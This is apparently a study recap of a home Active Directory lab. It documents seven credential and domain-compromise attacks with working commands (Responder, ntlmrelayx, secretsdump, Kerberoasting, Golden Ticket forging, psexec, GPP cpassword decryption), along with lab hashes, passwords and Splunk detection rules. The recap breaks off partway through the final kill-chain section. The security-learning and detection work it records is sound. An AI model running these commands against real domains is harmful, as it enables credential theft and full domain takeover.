# Sprint 1 — Complete Recap & Revision
### CorpLab | corp.local | 2026

> This document is a full revision of everything built, attacked, detected, and learned in Sprint 1.  
> It covers the AD concepts behind each attack, the tools used, the kill chains executed, and what it all means in the real world.  
> Read this before Sprint 2. Read it again before interviews.

---

## Table of Contents

1. [Active Directory Crash Course — Mapped to Our Lab](#1-active-directory-crash-course)
2. [Tools Glossary](#2-tools-glossary)
3. [Attack-by-Attack Breakdown](#3-attack-by-attack-breakdown)
   - ATK-001 LLMNR Poisoning
   - ATK-002 SMB Relay
   - ATK-003 Kerberoasting
   - ATK-004 AS-REP Roasting
   - ATK-005 BloodHound Enumeration
   - ATK-006 DCSync
   - ATK-007 GPP cpassword
4. [The Big Picture](#4-the-big-picture)
5. [Visibility Gap Map](#5-visibility-gap-map)
6. [The Full Kill Chain — How It All Connects](#6-the-full-kill-chain)

---

## 1. Active Directory Crash Course

### What is Active Directory?

Active Directory (AD) is Microsoft's directory service — the system that manages every user, computer, and resource in a corporate network. When you work at a company and log in with your work credentials, Active Directory is what checks your password, decides what you're allowed to access, and applies your desktop settings. It runs on a server called a **Domain Controller**.

In our lab, that's **DC01 at 10.10.10.40** running Windows Server 2022.

---

### The Domain — corp.local

A **domain** is a logical grouping of machines and users under one administrative authority. Our domain is `corp.local`. Every user account, every computer account, every group policy — all of it lives inside this domain and is managed by DC01.

When a machine is "domain-joined" it means it trusts DC01 to authenticate users. Our WIN11-PC at 10.10.10.50 is domain-joined. Kali is not — it's an outsider, which is exactly why it's interesting as an attacker machine.

```
corp.local (the domain)
│
├── DC01 (10.10.10.40) — the brain, runs everything
├── WIN11-PC (10.10.10.50) — domain workstation
│
├── OU=CorpUsers
│   ├── jsmith (Password123!)      ← compromised ATK-002
│   └── jdoe   (Password123!)      ← compromised ATK-004
│
├── OU=ServiceAccounts
│   └── svc-jenkins (Service@2025!) ← compromised ATK-003
│
└── OU=CorpGroups
    └── IT-Staff → jsmith, jdoe
```

---

### NTLM — The Old Authentication Protocol

**NTLM (NT LAN Manager)** is Microsoft's legacy authentication protocol. When you log in, Windows doesn't send your password — it sends a **hash** of your password (called an NTLM hash). The server challenges you to prove you know the password by encrypting a random value with that hash.

**Why attackers love NTLM:**
- The hash can be captured off the network (ATK-001, ATK-002)
- The hash can be used directly to authenticate without knowing the plaintext password — this is called **Pass-the-Hash**
- NTLM authentication happens automatically in the background when you access network resources — users don't even know it's happening

**In our lab:**

| Account | NTLM Hash |
|---|---|
| Administrator | 423fe085824dc357762259ddbb2631d2 |
| jsmith / jdoe | 2b576acbe6bcfda7294d6bd18041b8fe |
| svc-jenkins | 15a8eccc12c937774986f16cdef99758 |
| krbtgt | 94645007672cec1a5ac3a6ac6c08184e |

These hashes were dumped in ATK-001 and ATK-006. With them, an attacker can authenticate to any service that accepts NTLM — without ever cracking the password.

---

### Kerberos — The Modern Authentication Protocol

**Kerberos** is the primary authentication protocol in modern Active Directory. Unlike NTLM, it uses a ticket system — you prove your identity once to DC01, get a ticket, and use that ticket to access services without re-authenticating every time.

**The three key pieces:**

**KDC (Key Distribution Center)** — Lives on DC01. It's the trusted third party that issues all tickets. Has two components: the Authentication Service (AS) and the Ticket Granting Service (TGS).

**TGT (Ticket Granting Ticket)** — Your master ticket. You get this when you log in. It proves to the KDC that you are who you say you are, and you use it to request service tickets. Encrypted with the **krbtgt** account's hash — which is why the krbtgt hash is so valuable (Golden Ticket attack).

**TGS (Ticket Granting Service ticket / Service Ticket)** — A ticket for a specific service. Want to access a file share? You ask the KDC for a TGS for that service. The TGS is encrypted with the **service account's** hash — which is exactly what Kerberoasting abuses.

**The Kerberos flow in plain English:**
```
1. You log in → DC01 checks your password → issues you a TGT
2. You want to access \\DC01\SYSVOL → you show DC01 your TGT
3. DC01 issues you a TGS for the file service
4. You present the TGS to the file service → access granted
5. The service never talks to DC01 — it just validates the ticket itself
```

**SPNs (Service Principal Names)** — Every service that uses Kerberos has an SPN. It's a unique identifier that links a service to the account that runs it. In our lab, `svc-jenkins` had an SPN registered — that's what made it Kerberoastable.

---

### NTDS.DIT — The Crown Jewels

`NTDS.DIT` is the Active Directory database file. It lives on DC01 at `C:\Windows\NTDS\ntds.dit` and contains **every user account, every password hash, every Kerberos key** in the entire domain.

Getting a copy of NTDS.DIT — or replicating its contents via DCSync — means you own the entire domain. Every credential. Every account. Past, present, and anything created before you're evicted.

In ATK-006, we didn't touch the file directly. We abused the replication protocol to ask DC01 to send us the contents — exactly as if we were another Domain Controller.

---

### SYSVOL — The Public Share

**SYSVOL** is a file share that every Domain Controller hosts and every domain-joined machine reads at login. It contains Group Policy Objects (GPOs) — the rules that configure every machine and user in the domain. Login scripts, security settings, software deployment — all delivered via SYSVOL.

**The key property:** Every authenticated domain user can read SYSVOL. It has to be readable — otherwise Group Policy can't be applied. This is what ATK-007 abused. The attacker just needs one valid domain credential (jsmith:Password123!) to browse the entire SYSVOL tree.

---

### ACLs — Access Control Lists

Every object in Active Directory has an ACL — a list of who can do what to it. Most ACL entries are expected and harmless. But misconfigurations create attack paths.

**In our lab we had two critical ACL misconfigurations:**

1. **jdoe had GenericAll over jsmith** — GenericAll means full control. jdoe could reset jsmith's password, modify his attributes, or force him into groups without any admin rights. Found by BloodHound in ATK-005.

2. **jsmith had GetChanges + GetChangesAll on the domain object** — These are the replication rights that Domain Controllers need to sync with each other. jsmith, a regular user, had them — enabling DCSync in ATK-006.

Neither misconfiguration generated a single alert. Both were invisible until BloodHound mapped them (ATK-005) and secretsdump exploited them (ATK-006).

---

### LLMNR/NBT-NS — The Name Resolution Weakness

**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** are fallback protocols Windows uses when DNS fails. If you type `\\FILESERVER` and DNS doesn't know what FILESERVER is, Windows broadcasts a question to the whole network: "Does anyone know where FILESERVER is?"

The problem: **anyone can answer.** There's no authentication on these broadcasts. An attacker on the same network segment can respond "Yes, that's me!" and Windows will try to authenticate — sending an NTLM hash in the process.

This is fundamentally a design flaw, not a vulnerability. It works as intended. It just shouldn't be enabled on modern networks.

---

## 2. Tools Glossary

### 🔴 Offensive Tools

**Responder**
A network poisoning tool that listens for LLMNR/NBT-NS broadcasts and responds to them, capturing the NTLM authentication attempts that follow. Think of it as a fake server that tricks Windows into sending credentials. Used in ATK-001 and ATK-002. When SMB relay is the goal, Responder runs with SMB and HTTP turned off (so it captures but doesn't serve, leaving port 445 free for ntlmrelayx).

**Impacket**
A Python library and suite of tools for working with network protocols at a low level. Built by Fortra (formerly SecureAuth). It's the Swiss Army knife of Windows network attacks because it can speak SMB, Kerberos, DCE/RPC, LDAP — all the protocols that Active Directory uses — without needing a Windows machine.

Tools we used from Impacket:
- `impacket-secretsdump` — dumps credentials from SAM, LSA, and NTDS via multiple methods (ATK-001, ATK-006)
- `impacket-GetUserSPNs` — enumerates Kerberoastable accounts and requests their TGS tickets (ATK-003)
- `impacket-GetNPUsers` — requests AS-REP hashes for accounts with pre-auth disabled (ATK-004)
- `impacket-ntlmrelayx` — captures NTLM authentication and relays it to another target (ATK-002)
- `impacket-psexec` — remote command execution using SMB (ATK-001)
- `impacket-ticketer` — creates Golden Tickets from the krbtgt hash (ATK-001)
- `impacket-smbclient` — SMB client for browsing shares (ATK-007)

**evil-winrm**
A Ruby tool for connecting to Windows Remote Management (WinRM) — essentially an interactive shell over port 5985. Used when you have valid credentials (password or NTLM hash) and WinRM is enabled. More feature-rich than psexec for interactive sessions — supports file upload/download, PowerShell history, and pass-the-hash. Used in ATK-001 and ATK-003.

**bloodhound-python**
The data collection component of BloodHound. Connects to the domain as any authenticated user, queries LDAP for all users, groups, computers, GPOs, ACLs, and sessions, and exports everything as JSON files. It's doing what any domain user *can* do — just faster and more thoroughly than any human would. Used in ATK-005.

**BloodHound CE (Community Edition)**
A graph-based AD analysis tool. Takes the JSON files collected by bloodhound-python and loads them into a Neo4j graph database, then lets you query attack paths using Cypher queries. The key query: "Show me the shortest path from JDOE to DOMAIN ADMINS." It answered in 2 seconds and revealed the full jdoe→GenericAll→jsmith→GetChanges→Domain Admins chain. Used in ATK-005.

**John the Ripper / Hashcat**
Offline password cracking tools. They take a captured hash and try to find the plaintext password by hashing wordlist entries and comparing. "Offline" is the critical word — this happens entirely on the attacker's machine, with zero network traffic, making it completely undetectable. John was used for NetNTLMv2 (ATK-001, ATK-002), Kerberos TGS (ATK-003), and AS-REP (ATK-004) hashes.

**smbclient**
An SMB client built into Linux. Works like FTP for Windows file shares. Used in ATK-007 to browse SYSVOL and download Groups.xml. The same operation a Windows workstation performs automatically at login — just driven manually from Kali.

**gpp-decrypt / Python AES**
A tool (and the underlying crypto) for decrypting GPP cpassword values using Microsoft's published AES key. gpp-decrypt is a Ruby wrapper that was broken on our Kali build, so we implemented the same AES-256-CBC decryption in 10 lines of Python instead. The key is hardcoded and public — it never changes.

---

### 🔵 Defensive Tools

**Splunk Enterprise**
Our SIEM (Security Information and Event Management) system. Runs on blue-vm at 10.10.10.30. Collects logs from every VM in the lab via Universal Forwarders, indexes them, and lets us search, correlate, and alert across all sources simultaneously. The core of our blue team operation.

Key indexes:
- `index=windows` — DC01 Security/System/Application logs
- `index=sysmon` — DC01 Sysmon events (process creation, network, registry)
- `index=suricata` — OPNsense network IDS alerts
- `index=jenkins` — Jenkins build logs
- `index=linux` — prod-vm syslog/auth/Docker

**Sysmon (System Monitor)**
A Windows service from Sysinternals that logs process creation, network connections, file creation, registry changes, and more — things that Windows Security logs don't capture by default. Installed on DC01. Provides visibility into *what ran* and *what it connected to*, not just authentication events.

**Suricata**
A network IDS (Intrusion Detection System) running on OPNsense. Inspects network traffic against a ruleset (ET Open rules + custom rules) and writes alerts to EVE JSON format, forwarded to Splunk via syslog. Critical limitation in our lab: it only sees traffic that crosses the OPNsense firewall. Intra-LAN traffic between Kali (10.10.10.99) and DC01 (10.10.10.40) on the same network segment never passes through OPNsense — this is VIS-001.

**Sigma**
A generic signature format for SIEM detections — like Snort rules but for log-based detections instead of network traffic. A Sigma rule describes what to look for in log fields in a vendor-neutral way, then gets translated to Splunk SPL, Elastic KQL, or whatever query language your SIEM uses. We wrote a Sigma rule for every attack in Sprint 1.

---

## 3. Attack-by-Attack Breakdown

---

### ATK-001 — LLMNR Poisoning → Full Kill Chain
**Detection rate: 5/7 (71%) | MITRE: T1557.001, T1550.002, T1003.006, T1558.001**

#### The Concept
Windows machines on a network constantly ask questions. When DNS fails to resolve a hostname, Windows broadcasts "Does anyone know where \\FILESERVER is?" to the whole subnet using LLMNR. There's no verification of the answer. Responder sits on Kali, hears the broadcast, and lies: "That's me." Windows responds by trying to authenticate — sending an NTLMv2 hash in the process.

#### Cast of Characters
- **Victim:** WIN11-PC (10.10.10.50) — browsing the network, triggers an LLMNR query
- **Kali (10.10.10.99):** Running Responder, poisoning the response, capturing the hash
- **DC01 (10.10.10.40):** Target for subsequent stages once credentials are cracked
- **blue-vm (10.10.10.30):** Watching in Splunk — blind to the poisoning (VIS-001), sees the later stages

#### How It Worked — Stage by Stage

**Stage 1: Poison + Capture**
```bash
sudo responder -I eth0 -dwv
```
Responder answered the LLMNR broadcast. WIN11-PC sent an NTLMv2 challenge-response. Responder logged it. The hash looks like this:
```
Administrator::CORP:abc123...:NTLMv2-hash-data
```
This is NOT the NTLM hash — it's a challenge-response that proves the user knows the password. It can be cracked offline but can't be used for Pass-the-Hash.

**Stage 2: Offline Crack**
```bash
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
```
John tried passwords from the wordlist, hashed each one the same way Windows does, and compared. `CorpWin2025` matched. Password recovered. Completely offline — zero network traffic.

**Stage 3: WinRM Shell as Administrator**
```bash
evil-winrm -i 10.10.10.40 -u Administrator -p 'CorpWin2025'
```
Full interactive shell on DC01. At this point the domain is compromised.

**Stage 4: Pass-the-Hash**
```bash
evil-winrm -i 10.10.10.40 -u Administrator -H 423fe085824dc357762259ddbb2631d2
```
Using the NTLM hash directly — no password needed. Demonstrates that hash theft = full account access.

**Stage 5: DCSync (as Administrator)**
```bash
impacket-secretsdump CORP/Administrator:'CorpWin2025'@10.10.10.40
```
Dumped every hash in NTDS.DIT. Administrator, krbtgt, all users. Full domain credential database.

**Stage 6: Golden Ticket**
```bash
impacket-ticketer -nthash 94645007... -domain-sid S-1-5-21-... -domain corp.local Administrator
```
With the krbtgt hash you can forge a Kerberos TGT for any user, with any group membership, with any expiry. This ticket is valid as long as the krbtgt password hasn't been rotated — and most orgs never rotate it. Even if the Administrator password is reset, the Golden Ticket still works.

**Stage 7: psexec with the ticket**
```bash
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```
SYSTEM shell on DC01 using the forged ticket. Complete.

#### Real World "So What"
ATK-001 is how most ransomware operators get in. They sit on a network segment, wait for LLMNR traffic (which is constant in corporate environments), crack the hash, and they're in. From there: DCSync → Golden Ticket → every machine in the domain → ransomware deployment. The entire chain can run in under an hour on a poorly configured network.

#### What Splunk Saw
- ❌ LLMNR poisoning — VIS-001 (intra-LAN, no Suricata visibility)
- ❌ Offline crack — VIS-003 (happens on attacker's machine)
- ✅ EC4624 — WinRM logon from 10.10.10.99
- ✅ EC4624 — Pass-the-Hash (Logon Type 3, NTLM auth)
- ✅ EC4662 — DCSync GUIDs on domain object
- ✅ EC4769 — Golden Ticket usage (RC4 encryption, anomalous)
- ✅ EC7045 — psexec service installation (random 4-char service name)

---

### ATK-002 — SMB Relay
**Detection rate: 1/3 (33%) | MITRE: T1557.001**

#### The Concept
Instead of capturing the NTLM hash and cracking it offline, SMB Relay forwards the authentication attempt directly to another server in real time. The victim authenticates to Kali thinking it's the target. Kali immediately relays that authentication to DC01. DC01 sees a valid login from the victim's account. If SMB signing isn't enforced, this succeeds without ever knowing the password.

The critical prerequisite: **SMB signing must be disabled on the target.** DC01 in a default Windows Server 2022 configuration has SMB signing required — which is why our relay was blocked. But workstations often don't have signing enforced, making them valid relay targets.

#### Cast of Characters
- **Victim:** WIN11-PC — sends NTLM authentication
- **Kali:** Running both Responder (poison, no SMB) and ntlmrelayx (relay to DC01)
- **DC01:** The relay target — rejected us because SMB signing is required
- **jsmith:** The credential we recovered via fallback hash capture + offline crack

#### How It Worked

**The key Responder config change:**
```
# /etc/responder/Responder.conf
SMB = Off    ← critical — ntlmrelayx needs port 445
HTTP = Off
```

**Two tools running simultaneously:**
```bash
# Terminal 1 — poison
sudo responder -I eth0 -dwv

# Terminal 2 — relay
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**What happened:** DC01 rejected the relay (SMB signing required → `STATUS_ACCESS_DENIED`). But Responder still captured the NTLMv2 hash as a fallback. Offline crack recovered `jsmith:Password123!` — which became the foundation for ATK-003, ATK-004, ATK-005, ATK-006, and ATK-007.

#### Key Lesson
SMB signing is the single most effective mitigation against NTLM relay attacks. Microsoft enabled it by default on Domain Controllers but not on workstations. In a real environment, relaying to a workstation (not DC01) would have worked — giving local admin on that machine.

#### Real World "So What"
NTLM relay is one of the most common lateral movement techniques in real engagements. Attackers use it to move from an initial foothold to additional machines without cracking any passwords. The relay credential has the same access as the victim — if a domain admin's hash gets relayed, the attacker gets domain admin on the target.

#### What Splunk Saw
- ❌ LLMNR poisoning — VIS-001
- ✅ EC4624 — NTLM Type 3 logon from Kali IP (the relay attempt, even though it was denied)
- ❌ Offline crack — VIS-003

---

### ATK-003 — Kerberoasting
**Detection rate: 2/4 (50%) | MITRE: T1558.003**

#### The Concept
Any authenticated domain user can request a Kerberos service ticket (TGS) for any service that has an SPN registered. The TGS is encrypted with the service account's NTLM hash. The attacker requests the ticket, takes it offline, and cracks the service account's password — all using completely legitimate Kerberos functionality.

The target: **svc-jenkins** — a service account with an SPN (`HTTP/jenkins.corp.local`) and a crackable password (`Service@2025!`). Service accounts are perfect Kerberoasting targets because they often have weak passwords set years ago, never changed, and high privileges.

#### Cast of Characters
- **jsmith:** The authenticated user making the request (any domain user works)
- **DC01:** The KDC — issues the TGS when asked, no questions asked
- **svc-jenkins:** The target — its hash is inside the TGS ticket
- **Kali:** Requests the ticket, takes it offline, cracks it
- **Splunk:** Sees EC4769 — the TGS request

#### How It Worked

**Step 1: Enumerate SPNs (who's Kerberoastable?)**
```bash
impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40
```
Output: `svc-jenkins` has SPN `HTTP/jenkins.corp.local`. It's the target.

**Step 2: Request the TGS (and steal it)**
```bash
impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request
```
DC01 hands over a TGS encrypted with svc-jenkins's hash. This is legitimate Kerberos behavior — DC01 cannot refuse this request from an authenticated user.

**Step 3: Crack offline**
```bash
john --format=krb5tgs --wordlist=/tmp/corp_wordlist.txt /tmp/svc-jenkins.hash
```
Result: `Service@2025!`

**Step 4: Authenticate as svc-jenkins**
```bash
evil-winrm -i 10.10.10.40 -u svc-jenkins -p 'Service@2025!'
```
Shell on DC01 as the service account.

#### The Detection Fingerprint
EC4768 (TGT request) + EC4769 (TGS request) fired **9ms apart** from a Linux IP. No human or legitimate system does this — only an automated tool. This timing correlation is a high-fidelity Kerberoasting indicator.

Additionally: the TGS was requested with **RC4 encryption (0x17)** — modern clients use AES. Legitimate Kerberos traffic uses AES256 (0x12). RC4 in EC4769 is a near-certain Kerberoasting indicator.

#### Real World "So What"
Service accounts are everywhere in enterprise environments. Exchange, SQL Server, backup agents, monitoring tools — all run as service accounts, many with SPNs, many with weak passwords set during initial deployment and never rotated. Kerberoasting gives attackers those passwords without ever touching the service account's machine. In large environments, automated tools can Kerberoast hundreds of accounts simultaneously.

#### What Splunk Saw
- ❌ SPN enumeration — VIS-005 (LDAP queries leave no Security log entry)
- ✅ EC4768 + EC4769 — TGT and TGS requests, 9ms apart, from Linux IP
- ❌ Offline crack — VIS-003
- ✅ EC4624 — svc-jenkins WinRM logon from Kali

---

### ATK-004 — AS-REP Roasting
**Detection rate: 2/4 (50%) | MITRE: T1558.004**

#### The Concept
Normally, Kerberos requires pre-authentication — before issuing a TGT, the KDC asks the client to prove it knows the password by encrypting a timestamp. If an account has pre-authentication **disabled**, the KDC will issue a TGT to anyone who asks for it, no proof required. That TGT is encrypted with the account's hash — and can be cracked offline.

The difference from Kerberoasting: you don't need any credentials at all to perform AS-REP roasting. You just need to know the username.

The target: **jdoe** — configured with "Do not require Kerberos preauthentication" ticked in AD Users and Computers.

#### Cast of Characters
- **jdoe:** The victim — pre-auth disabled, AS-REP hash requestable by anyone
- **DC01:** The KDC — issues the AS-REP because it's configured to
- **jsmith:** Used to enumerate which accounts are AS-REP roastable
- **Kali:** Requests the AS-REP, cracks it offline
- **Splunk:** Sees EC4768 with Pre-Authentication Type = 0

#### How It Worked

**Request the AS-REP hash:**
```bash
impacket-GetNPUsers corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request -outputfile /tmp/jdoe.hash
```
DC01 responds with an AS-REP containing jdoe's hash. No password needed to ask.

**Crack offline:**
```bash
john --format=krb5asrep --wordlist=/tmp/corp_wordlist.txt /tmp/jdoe.hash
```
Result: `Password123!`

**WinRM attempt:** jdoe is not in Remote Management Users — blocked. But the credential was recovered.

**ACL discovery:** jdoe has GenericAll over jsmith — discovered but not exploited until ATK-005 mapped the full path.

#### The Detection Fingerprint
EC4768 with **Pre-Authentication Type = 0** from a Linux IP is one of the highest-fidelity detections in all of Sprint 1. Legitimate clients never send Pre-Auth Type 0 — only attackers deliberately requesting AS-REP hashes do. Near-zero false positive rate.

#### Real World "So What"
AS-REP roasting requires no prior credentials — just a username list. In a real engagement, attackers enumerate usernames via LDAP or even LinkedIn, then AS-REP roast the whole list. Any account with pre-auth disabled becomes an immediate target. The recovered credential then opens every door that account has access to.

---

### ATK-005 — BloodHound AD Enumeration
**Detection rate: 0/3 (0%) — Fully Silent | MITRE: T1069.002, T1087.002**

#### The Concept
BloodHound maps the entire Active Directory environment as a graph — every user, group, computer, GPO, ACL, and session — and then finds attack paths through that graph. What would take a human analyst weeks of manual ACL review, BloodHound completes in seconds.

The insight: **in AD, it's not just about who you are — it's about what you can reach.** A low-privileged user with GenericAll over a user with DCSync rights is effectively a domain admin, even if their account looks harmless.

#### Cast of Characters
- **jsmith:** The authenticated collector — any domain user can collect this data
- **DC01 / LDAP:** The data source — all this information is legitimately accessible via LDAP
- **Kali:** Running bloodhound-python (collection) and BloodHound CE (analysis)
- **Splunk:** Saw absolutely nothing

#### How It Worked

**Collection — query everything via LDAP:**
```bash
bloodhound-python -u jsmith -p 'Password123!' -d corp.local -ns 10.10.10.40 -c all
```
Output: 7 JSON files — users, groups, computers, GPOs, ACLs, sessions, domains.
Stats: 7 users, 53 groups, 2 computers, 6 GPOs, 5 OUs, 19 containers.

**Analysis — find the kill chain:**
Uploaded to BloodHound CE. Ran the Cypher query:
```
MATCH p=shortestPath((u:User {name:"JDOE@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

**Result in 2 seconds:**
```
JDOE → GenericAll → JSMITH → GetChanges → CORP.LOCAL → Domain Admins
```

**Additional finding:** DC01 has `unconstraineddelegation=true` — a separate attack path for future exploitation (ATK-008 backlog).

#### Why It's Fully Silent
LDAP queries are how AD is supposed to work. Every domain-joined machine queries LDAP constantly. BloodHound's queries are slightly more comprehensive than normal, but they use the same protocol, the same port (389/636), and the same permissions as any authenticated user already has. Windows Security logs have no event ID for "someone ran a large LDAP query."

VIS-005 (no LDAP audit logging), VIS-006 (no ACL enumeration logging), and VIS-007 (no BloodHound pattern detection) all contributed to 0% detection.

#### Real World "So What"
BloodHound changed offensive security forever when it was released in 2016. Before it, finding AD attack paths required manual analysis that took days. Now any attacker with a domain account can map the entire organization's privilege structure in minutes. Red teamers use it on every engagement. The path JDOE→Domain Admins that took BloodHound 2 seconds to find could exist in an org's AD for years without anyone noticing.

---

### ATK-006 — DCSync via jsmith ACL Rights
**Detection rate: 2/4 (50%) | MITRE: T1003.006**

#### The Concept
Domain Controllers replicate with each other using the **Directory Replication Service (DRS)** protocol. When DC01 needs to sync with a second DC, it sends a replication request using specific extended rights: `GetChanges` (GUID: 1131f6aa) and `GetChangesAll` (GUID: 1131f6ad). These rights are what allow one DC to ask another "give me all the changes since our last sync."

If a **regular user account** is granted these same rights on the domain object, they can impersonate a Domain Controller and request a full replication — receiving every credential in NTDS.DIT without ever touching the DC's disk.

jsmith had these rights. ATK-005 found the path. ATK-006 exploited it.

#### Cast of Characters
- **jsmith:** Has GetChanges + GetChangesAll on DC=corp,DC=local — the misconfigured ACL
- **Kali:** Runs secretsdump, impersonates a DC, requests full replication
- **DC01:** Receives the DRS request, checks ACLs, finds jsmith is authorized, complies
- **Splunk:** Sees 28 EC4662 events — the clearest detection in Sprint 1

#### How It Worked

```bash
impacket-secretsdump 'corp.local/jsmith:Password123!@10.10.10.40'
```

secretsdump authenticates as jsmith, connects to DC01's DRS endpoint over RPC, and sends a replication request. DC01 checks: does jsmith have the GetChanges GUIDs on the domain object? Yes. DC01 responds exactly as it would to another Domain Controller.

**Output — entire domain in one command:**
```
Administrator:500:...:423fe085824dc357762259ddbb2631d2:::
krbtgt:502:...:94645007672cec1a5ac3a6ac6c08184e:::
jsmith / jdoe / svc-jenkins / DC01$ / WIN11-PC$ — all hashes
+ AES256 and AES128 Kerberos keys for every account
```

**Key finding:** The first run at 03:47 was denied (ACL not yet set) — but EC4662 **still fired** for the denied attempt. Detection works on both success and failure.

#### The Detection Fingerprint
EC4662 with GUIDs `1131f6aa` or `1131f6ad` from an account NOT ending in `$` (not a machine account) is the definitive DCSync indicator. 28 events fired in two bursts within milliseconds of an EC4624 logon from 10.10.10.99. The timeline correlation is unambiguous.

```spl
index=windows EventCode=4662
| search _raw="*1131f6aa*" OR _raw="*1131f6ad*"
| where NOT match(Account_Name, "\$$")
```

#### Real World "So What"
DCSync is used in nearly every advanced persistent threat (APT) operation that reaches domain admin level. It's clean — no files written to the DC, no process injection, no service installation. Just a network request using a legitimate protocol. The credential dump it produces enables Golden Ticket creation (ATK-001 Stage 6), Pass-the-Hash across the entire domain, and complete persistent access even after password resets (as long as krbtgt isn't rotated twice).

---

### ATK-007 — GPP cpassword Extraction
**Detection rate: 0/3 (0%) — Fully Silent | MITRE: T1552.006**

#### The Concept
Between 2008 and 2014, Microsoft's Group Policy Preferences allowed administrators to push local account passwords, scheduled task credentials, and drive mapping credentials via GPO. These passwords were encrypted with AES-256 and stored in XML files on SYSVOL. In 2012, Microsoft published the static AES decryption key in their own protocol documentation (MS-GPPREF). It never changes. Every cpassword ever created by GPP can be decrypted with it.

Microsoft released MS14-025 in 2014 to disable GPP password creation going forward — but it didn't delete existing files. Organizations that used GPP before 2014 may still have these files sitting in SYSVOL today.

#### Cast of Characters
- **jsmith:** Any authenticated domain user — SYSVOL is world-readable
- **DC01 / SYSVOL:** Hosting the Groups.xml file with the cpassword
- **Kali:** Browses the share, downloads the file, decrypts locally
- **Splunk:** Saw nothing

#### How It Worked

**Browse SYSVOL — completely normal SMB operation:**
```bash
smbclient //10.10.10.40/SYSVOL -U 'corp.local/jsmith%Password123!' -c 'recurse; ls'
```
Found: `{CORPLAB-GPP-TEST}/Machine/Preferences/Groups/Groups.xml`

**Download the file:**
```bash
smbclient //10.10.10.40/SYSVOL -U 'corp.local/jsmith%Password123!' \
  -c 'get corp.local/Policies/{CORPLAB-GPP-TEST}/Machine/Preferences/Groups/Groups.xml /tmp/Groups.xml'
```

**The file contents:**
```xml
<Properties userName="CorpAdmin"
            cpassword="QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc="
            groupSid="S-1-5-32-544"/>
```

**Decrypt with the published Microsoft AES key:**
```python
python3 -c "
import base64
from Crypto.Cipher import AES
key = bytes([0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,...])
data = base64.b64decode('QYzGjG42upM6mQXrirfg52oa8I8Yh9dCwlJ39X420Hc=')
cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00'*16)
print(cipher.decrypt(data).decode('utf-16-le').rstrip('\x00'))
"
# Output: CorpAdmin2025!
```

#### Real World "So What"
GPP passwords were typically pushed to **all workstations** via Group Policy — meaning one cpassword gives local admin on every machine in the domain simultaneously. With local admin across the fleet: dump LSASS on every machine, find a domain admin's cached credentials, lateral movement complete. The credential `CorpAdmin2025!` sitting in a forgotten XML file from 2014 is a full domain compromise waiting to happen.

#### Why It's Fully Silent
SYSVOL access is normal. Every workstation reads SYSVOL at login to pull Group Policy. File reads within SYSVOL don't generate meaningful Security event log entries. The decryption is local. There is no network anomaly, no suspicious event ID, no alert. The only effective control is prevention — audit SYSVOL for cpassword attributes and delete them.

---

## 4. The Big Picture

### Sprint 1 Final Scoreboard

| Attack | Technique | Stages | Detected | Rate |
|---|---|---|---|---|
| ATK-001 LLMNR Kill Chain | T1557.001 + chain | 7 | 5 | 71% |
| ATK-002 SMB Relay | T1557.001 | 3 | 1 | 33% |
| ATK-003 Kerberoasting | T1558.003 | 4 | 2 | 50% |
| ATK-004 AS-REP Roasting | T1558.004 | 4 | 2 | 50% |
| ATK-005 BloodHound Enum | T1069.002 | 3 | 0 | 0% |
| ATK-006 DCSync | T1003.006 | 4 | 2 | 50% |
| ATK-007 GPP cpassword | T1552.006 | 3 | 0 | 0% |
| **Sprint 1 Total** | | **28** | **12** | **43%** |

### What Does 43% Mean?

It means that with a default Splunk + Windows Security logging setup, nearly **6 in 10 attack stages go completely undetected**. This is realistic — most organizations start here. The gaps aren't failures; they're the roadmap for Sprint 4 hardening.

**The two categories of blind spots:**

1. **Protocol-level blind spots** — LLMNR poisoning, LDAP enumeration, SMB file reads. These use legitimate protocols doing legitimate things. Windows has no event ID for "someone answered an LLMNR broadcast maliciously." The fix is network-layer controls (Suricata after VIS-001 is resolved) and disabling the protocols entirely.

2. **Offline operation blind spots** — Hash cracking, local decryption. Happens entirely on the attacker's machine. No fix from a logging perspective — the defense is preventing hash theft upstream.

**The high-value detections that did work:**

- **EC4662** — DCSync. Near-zero false positive rate. If you implement one detection from Sprint 1, this is it.
- **EC4769 RC4** — Kerberoasting. RC4 encryption type in TGS requests is anomalous in modern environments.
- **EC4768 Pre-Auth=0** — AS-REP Roasting. Legitimate clients never send this.
- **EC7045 short service name** — psexec. Random 4-character service names are a classic impacket fingerprint.

---

## 5. Visibility Gap Map

| ID | What's Blind | Why | Attack Affected | Fix (Sprint 4) |
|---|---|---|---|---|
| VIS-001 | Intra-LAN traffic | Kali + DC01 on same L2 — no traffic crosses OPNsense | ATK-001, ATK-002, ATK-003 | vSwitch SPAN port mirroring |
| VIS-002 | Sysmon not confirmed in Splunk | Forwarding unverified | All attacks | Verify dc-vm UF inputs.conf |
| VIS-003 | Offline hash cracking | Happens on attacker machine | ATK-001, ATK-002, ATK-003, ATK-004 | Prevent hash theft upstream |
| VIS-004 | Relay victim events only on target host | UF not on all Windows hosts | ATK-002 | UF on all Windows hosts |
| VIS-005 | LDAP enumeration silent | No Security event for LDAP queries | ATK-003 (SPN enum), ATK-005 | Honeypot SPNs + LDAP audit |
| VIS-006 | ACL enumeration silent | No event for GenericAll/GetChanges reads | ATK-005, ATK-006 (ACL grant) | Advanced AD object access auditing |
| VIS-007 | No BloodHound detection | Intra-LAN + no LDAP audit | ATK-005 | Suricata custom rule after VIS-001 |
| VIS-008 | GPP cpassword extraction silent | SMB file read = normal GP operation | ATK-007 | Audit + delete GPP files; LAPS |
| VIS-009 | No alert on cpassword file read | No per-file auditing on SYSVOL | ATK-007 | Object-level file auditing (high noise) |

---

## 6. The Full Kill Chain — How It All Connects

This is the most important section. These weren't seven isolated attacks. They were **one continuous compromise**, each attack building on the last.

```
[ATK-001] Responder poisons LLMNR broadcast
